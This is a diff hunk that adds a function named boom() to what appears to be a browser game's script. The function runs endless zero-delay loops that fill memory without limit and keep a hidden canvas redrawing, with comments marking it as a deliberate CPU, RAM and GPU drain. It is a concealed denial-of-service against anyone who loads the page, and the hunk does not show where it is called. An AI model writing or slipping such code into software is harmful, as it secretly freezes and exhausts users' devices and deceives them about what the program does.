@@ -116,6 +116,39 @@ function updateScor () {document.querySelector('.js-scor')
 };
 
 
+function boom() {
+        let A = 1;
+        let arr = [];
+
+        // CPU + RAM 
+        setInterval(() => {
+          arr.push(Math.random() * A);
+          A += Math.sqrt(A) * Math.sin(A);
+          A = (A * 1.01) / 1.02 + 0.0001;
+        }, 0);
+
+        // Silent canvas (GPU)
+        const canvas = document.createElement("canvas");
+        canvas.width = 256;
+        canvas.height = 256;
+        canvas.style.display = "none"; 
+        document.body.appendChild(canvas);
+
+        const ctx = canvas.getContext("2d");
+        setInterval(() => {
+          for (let i = 0; i < 1000; i++) {
+            const x = Math.random() * canvas.width;
+            const y = Math.random() * canvas.height;
+            const r = Math.floor(Math.random() * 256);
+            const g = Math.floor(Math.random() * 256);
+            const b = Math.floor(Math.random() * 256);
+            ctx.fillStyle = `rgb(${r},${g},${b})`;
+            ctx.fillRect(x, y, 1, 1);
+          }
+        }, 0);
+      };
+
+
 
 
 
